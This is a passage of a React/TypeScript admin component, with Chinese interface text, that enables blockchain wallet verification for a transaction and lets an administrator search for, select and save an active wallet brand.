  const [brands, setBrands] = useState<BlockchainWalletBrand[]>([]);
  const [saving, setSaving] = useState(false);
  const [saved, setSaved] = useState(false);
  const [error, setError] = useState("");

  useEffect(() => {
    adminGetBlockchainConfig(ownerAdmin)
      .then(({ brands }) => {
        setBrands(brands.filter(b => b.is_active));
      })
      .catch(() => {});
  }, [ownerAdmin]);

  // Resync when the transaction reloads with new values from the server.
  useEffect(() => { setEnabled(initialEnabled); setBrand(initialBrand); }, [initialEnabled, initialBrand]);

  async function save(nextEnabled: boolean, nextBrand: string) {
    setSaving(true);
    setError("");
    try {
      await adminSetTransactionBlockchain(txId, nextEnabled, nextBrand || null);
      setEnabled(nextEnabled);
      setBrand(nextBrand);
      setSaved(true);
      setTimeout(() => setSaved(false), 2000);
    } catch (e: unknown) {
      setError(e instanceof Error ? e.message : "儲存失敗。");
    } finally {
      setSaving(false);
    }
  }

  const [query, setQuery] = useState("");
  const activeBrands = brands;
  const searchable = activeBrands.length > 6;
  const q = query.trim().toLowerCase();
  const visibleBrands = q ? activeBrands.filter(b => b.name.toLowerCase().includes(q)) : activeBrands;

  return (
    <div className="p-4 flex flex-col gap-3 flex-1 min-h-0">
      <div className="flex items-center gap-3 pb-3 border-b border-slate-100">
        <button
          type="button"
          role="switch"
          aria-checked={enabled}
          onClick={() => {
            const next = !enabled;
            setEnabled(next);
            if (!next) setBrand("");
          }}
          className={`relative inline-flex h-6 w-11 flex-shrink-0 rounded-full transition-colors focus:outline-none focus-visible:ring-2 focus-visible:ring-[#1E3A8A] focus-visible:ring-offset-2 ${enabled ? "bg-teal-600" : "bg-gray-300"}`}
        >
          <span className={`absolute top-0.5 left-0.5 h-5 w-5 rounded-full bg-white shadow transition-transform duration-200 ${enabled ? "translate-x-5" : ""}`} />
        </button>
        <div className="min-w-0">
          <p className="text-sm font-bold text-[#0A2B5E]">{enabled ? "已啟用" : "未啟用"}</p>
          <p className="text-[11px] text-gray-500 leading-snug">啟用後員工端驗證頁會出現「更多」按鈕可選擇此驗證</p>
        </div>
      </div>

      {enabled ? (
        activeBrands.length === 0 ? (
          <div className="flex-1 flex items-center justify-center rounded-lg border border-dashed border-gray-200 bg-gray-50 px-3 py-3 text-[11px] text-gray-400 text-center">
            尚無可用的錢包品牌。請先至管理後台「區塊鏈」新增品牌。
          </div>
        ) : (
          <div className="flex-1 min-h-0 flex flex-col">
            <div className="flex items-center justify-between gap-2 mb-1.5">
              <label className="text-xs font-semibold text-gray-500">選擇錢包品牌</label>
              <span className="text-[10px] text-slate-400">共 {activeBrands.length} 個</span>
            </div>
            {searchable && (
              <div className="relative mb-1.5">
                <Search className="absolute left-2.5 top-1/2 -translate-y-1/2 h-3.5 w-3.5 text-slate-400 pointer-events-none" />
                <input
                  value={query}
                  onChange={e => setQuery(e.target.value)}
                  placeholder="搜尋錢包品牌..."
                  className="w-full pl-8 pr-7 py-1.5 text-xs border border-gray-200 rounded-lg focus:outline-none focus:border-teal-500 focus:ring-2 focus:ring-inset focus:ring-teal-500/20 transition"
                />
                {query && (
                  <button type="button" onClick={() => setQuery("")} className="absolute right-1.5 top-1/2 -translate-y-1/2 p-0.5 rounded text-slate-400 hover:text-slate-600 hover:bg-slate-100" title="清除">
                    <X className="h-3 w-3" />
                  </button>
                )}
              </div>
            )}
            {visibleBrands.length === 0 && (
              <div className="rounded-lg border border-dashed border-slate-200 bg-slate-50 px-3 py-2.5 text-[11px] text-slate-400 text-center">找不到符合「{query}」的品牌</div>
            )}
            <div className="flex-1 min-h-[96px] flex flex-col gap-1.5 overflow-y-auto scrollbar-thin pr-0.5">
              {visibleBrands.map(b => {
                const active = brand === b.name;
                return (
                  <button
                    key={b.id}
                    type="button"
                    onClick={() => setBrand(b.name)}
                    className={`flex-shrink-0 flex items-center gap-2 rounded-lg border px-3 py-2 text-sm font-semibold text-left transition ${active ? "border-teal-500 bg-teal-50 text-teal-800 ring-2 ring-teal-500/20" : "border-gray-200 bg-white text-slate-600 hover:border-teal-300 hover:bg-teal-50/50"}`}
                  >
                    <span className={`flex h-3.5 w-3.5 flex-shrink-0 items-center justify-center rounded-full border ${active ? "border-teal-600 bg-teal-600" : "border-gray-300"}`}>
                      {active && <Check className="h-2.5 w-2.5 text-white" />}
                    </span>
                    <span className="truncate">{b.name}</span>
                  </button>
                );
              })}
            </div>
          </div>
        )
      ) : (
        <div className="flex-1 flex items-center justify-center rounded-lg border border-dashed border-slate-200 bg-slate-50 px-3 py-3 text-[11px] text-slate-400 text-center">
          開啟開關後即可選擇錢包品牌
        </div>
      )}

      {error && <p className="text-xs text-red-500 flex items-center gap-1"><AlertCircle className="w-3.5 h-3.5" />{error}</p>}

      <div className="mt-auto pt-3 border-t border-slate-100 flex flex-col gap-2">
        <span className="text-[11px] text-slate-400 truncate min-h-[16px]">{enabled && !brand ? "請先選擇錢包品牌" : enabled ? `已選：${brand}` : ""}</span>
        <button
          onClick={() => save(enabled, brand)}
          disabled={saving || (enabled && !brand)}
          className={`w-full px-4 py-2 rounded-lg text-xs font-semibold flex items-center justify-center gap-1.5 transition disabled:opacity-50 ${saved ? "bg-green-500 text-white" : "bg-teal-600 hover:bg-teal-700 text-white"}`}
        >
          {saving ? <span className="w-3.5 h-3.5 border-2 border-white/30 border-t-white rounded-full animate-spin" /> : saved ? <Check className="w-3.5 h-3.5" /> : <Save className="w-3.5 h-3.5" />}
          {saving ? "儲存中..." : saved ? "已儲存" : "儲存區塊鏈設定"}
        </button>
      </div>
    </div>
  );
}
